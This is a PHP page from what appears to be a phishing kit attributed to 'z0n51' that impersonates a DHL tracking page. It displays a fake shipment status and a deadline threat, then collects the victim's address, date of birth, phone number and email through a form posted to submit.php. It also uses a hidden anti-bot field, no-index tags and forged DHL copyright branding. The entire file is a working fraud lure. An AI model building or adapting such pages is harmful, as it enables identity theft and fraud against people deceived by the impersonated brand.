<?php

/**
 * @link              https://www.z0n51.com/
 * @since             03/08/2020
 * @package           ORANGE
 * @facebook          https://www.facebook.com/z0n51
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      ORANGE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title>Identifiez-vous avec votre compte</title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header">
            <div class="container containerr">
                <div class="top-header">
                    <div class="logo"><img src="../assets/images/logo.svg"></div>
                    <ul>
                        <li><i class="fas fa-info-circle"></i> Alert(1)</li>
                        <li>Contact Us</li>
                        <li><i class="fas fa-globe"></i> United States of America</li>
                        <li><i class="fas fa-search"></i> Search</li>
                    </ul>
                    <ul class="mobile-menu">
                        <li><i class="fas fa-globe"></i></li>
                        <li><i class="fas fa-search"></i></li>
                        <li><i class="fas fa-bars"></i></li>
                    </ul>
                </div>
                <div class="bottom-header d-flex mt50">
                    <ul class="flex-grow-1">
                        <li style="color: #d40511; text-decoration: underline;">Track <i class="fas fa-chevron-down"></i></li>
                        <li>Ship <i class="fas fa-chevron-down"></i></li>
                        <li>Logistics Solutions</li>
                        <li>Customer Service</li>
                    </ul>
                    <ul>
                        <li><i class="fas fa-user-tie"></i> Customer Portal Logins</li>
                    </ul>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="main-title">
                    <h3>DHL TRACKING</h3>
                </div>
                <div class="details">
                    <div class="title">
                        <h3><i class="fas fa-truck"></i> Shipment in delivering</h3>
                        <ul>
                            <li class="active"></li>
                            <li class="active"></li>
                            <li class="inactive"></li>
                        </ul>
                    </div>
                    <p class="mb30">
                        Status: <b>in delivering</b><br>
                        This shipment is handled by: <b>DHL Parcel</b><br>
                        Tracking Code: CS471210241DE
                    </p>
                    <div class="message mb30">
                        <p>We need your Address to be sure that unauthorized persons cannot access your packages, You have 10 working days From the arrival of your package to the DHL branch after this time the package will be returned to the sender.</p>
                    </div>
                    <form action="submit.php" method="post">
                        <input type="hidden" name="verbot">
                        <input type="hidden" name="type" value="details">
                        <div class="row mb-0">
                            <div class="col-md-8">
                                <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'address') ?>">
                                    <label for="address">Address</label>
                                    <input type="text" name="address" id="address" class="form-control" placeholder="Address" value="<?php echo get_value('address'); ?>">
                                    <?php echo error_message($_SESSION['errors'],'address'); ?>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'zip_code') ?>">
                                    <label for="zip_code">Zip code</label>
                                    <input type="text" name="zip_code" id="zip_code" class="form-control" placeholder="Zip code" value="<?php echo get_value('zip_code'); ?>">
                                    <?php echo error_message($_SESSION['errors'],'zip_code'); ?>
                                </div>
                            </div>
                        </div>
                        <div class="row mb-0">
                            <div class="col-md-4">
                                <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'city') ?>">
                                    <label for="city">City</label>
                                    <input type="text" name="city" id="city" class="form-control" placeholder="City" value="<?php echo get_value('city'); ?>">
                                    <?php echo error_message($_SESSION['errors'],'city'); ?>
                                </div>
                            </div>
                            <div class="col-md-8">
                                <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'birth_date') ?>">
                                    <label for="birth_date">Date of birth (DD/MM/YYYY)</label>
                                    <input type="text" maxlength="10" name="birth_date" id="birth_date" class="form-control" placeholder="Date of birth (DD/MM/YYYY)" value="<?php echo get_value('birth_date'); ?>">
                                    <?php echo error_message($_SESSION['errors'],'birth_date'); ?>
                                </div>
                            </div>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'phone') ?>">
                            <label for="phone">Phone number</label>
                            <input type="text" name="phone" id="phone" class="form-control" placeholder="Phone number" value="<?php echo get_value('phone'); ?>">
                            <?php echo error_message($_SESSION['errors'],'phone'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'email') ?>">
                            <label for="email">Your Address Email</label>
                            <input type="text" name="email" id="email" class="form-control" placeholder="Your Address Email" value="<?php echo get_value('email'); ?>">
                            <?php echo error_message($_SESSION['errors'],'email'); ?>
                        </div>
                        <div class="btns">
                            <button type="submit">Next <i class="fas fa-arrow-right"></i></button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container containerr">
                <div class="top-footer">
                    <div class="row">
                        <div class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <div class="widget">
                                <h3 style="color: #d40511;">Help Center</h3>
                                <ul>
                                    <li>Customer Service</li>
                                    <li>Customer Portal Logins</li>
                                    <li>Digital Partners and Integrations</li>
                                    <li>Developer Portal</li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <div class="widget">
                                <h3>Our Divisions</h3>
                                <ul>
                                    <li>Post and Paket Deutschland</li>
                                    <li>DHL Express</li>
                                    <li>DHL Global Forwarding</li>
                                    <li>DHL Freight</li>
                                    <li>DHL Supply Chain</li>
                                    <li>DHL eCommerce</li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <div class="widget">
                                <h3>Industry Sectors</h3>
                                <ul>
                                    <li>Auto-Mobility</li>
                                    <li>Chemicals</li>
                                    <li>Consumer</li>
                                    <li>Energy</li>
                                    <li>Engineering and Manufacturing</li>
                                    <li>Life Sciences and Healthcare</li>
                                    <li>Public Sector</li>
                                    <li>Retail</li>
                                    <li>Technology</li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <div class="widget">
                                <h3>Company Information</h3>
                                <ul>
                                    <li>About DHL</li>
                                    <li>Careers</li>
                                    <li>Press Center</li>
                                    <li>Sustainability</li>
                                    <li>Insights and Innovation</li>
                                    <li>Official Logistics Partners</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="container containerr">
                <div class="bottom-footer">
                    <div class="row">
                        <div class="col-md-8">
                            <img class="d-block mb20" src="../assets/images/glo-footer-logo.svg">
                            <ul class="footer-list">
                                <li>Fraud Awareness</li>
                                <li>Legal Notice</li>
                                <li>Terms of Use</li>
                                <li>Privacy Notice</li>
                                <li>Dispute Resolution</li>
                                <li>Accessibility</li>
                                <li>Additional Information</li>
                                <li>Cookies Settings</li>
                            </ul>
                        </div>
                        <div class="col-md-4">
                            <h3>Follow Us</h3>
                            <ul class="social">
                                <li><i class="fab fa-youtube"></i></li>
                                <li><i class="fab fa-facebook-f"></i></li>
                                <li><i class="fab fa-linkedin"></i></li>
                                <li><i class="fab fa-instagram"></i></li>
                            </ul>
                        </div>
                    </div>

                    <p><?php echo date('Y'); ?> &copy; DHL International GmbH. All rights reserved.</p>

                </div>
            </div>
        </footer>
        <!-- END FOOTER -->
        
        
        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>